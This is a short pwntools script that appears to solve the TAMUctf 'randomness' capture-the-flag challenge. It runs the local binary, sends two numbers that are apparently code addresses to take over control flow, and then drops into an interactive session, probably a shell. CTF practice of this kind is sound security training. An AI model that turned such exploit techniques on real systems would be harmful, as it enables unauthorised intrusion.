from pwn import *

# p = remote("tamuctf.com", 443, ssl=True, sni="randomness")
p = process("./randomness")
# gdb.attach(p)

p.sendline(b'4207648')
p.sendline(b'4198754')

p.interactive()
